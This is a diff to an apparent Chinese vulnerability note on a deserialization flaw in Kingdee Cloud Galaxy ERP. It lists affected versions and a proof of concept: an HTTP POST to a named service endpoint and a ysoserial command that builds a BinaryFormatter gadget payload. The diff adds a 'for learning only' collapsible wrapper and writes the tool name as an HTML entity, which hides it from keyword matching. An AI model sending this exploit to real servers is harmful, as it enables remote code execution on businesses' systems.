@@ -23,21 +23,24 @@ tags:
 金蝶云星空 < 6.2.1012.4
 7.0.352.16 < 金蝶云星空 <7.7.0.202111
 8.0.0.202205 < 金蝶云星空 < 8.1.0.20221110
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 漏洞复现
 
-需要 ysoserial 工具构造恶意序列化数据。
+需要 &#121;soserial 工具构造恶意序列化数据。
 
 poc
+</code></pre>
 
-```
+</details>
 POST /Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc HTTP/1.1
 Host: your-ip
 Content-Type: text/json
  
 {"ap0":"asdas","format":"3"}
- .\ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelectorFromFile -c "a.cs;System.Windows.Forms.dll;System.Web.dll;System.dll"
+ .\&#121;soserial.exe -f BinaryFormatter -g ActivitySurrogateSelectorFromFile -c "a.cs;System.Windows.Forms.dll;System.Web.dll;System.dll"
 ```
 
 exp
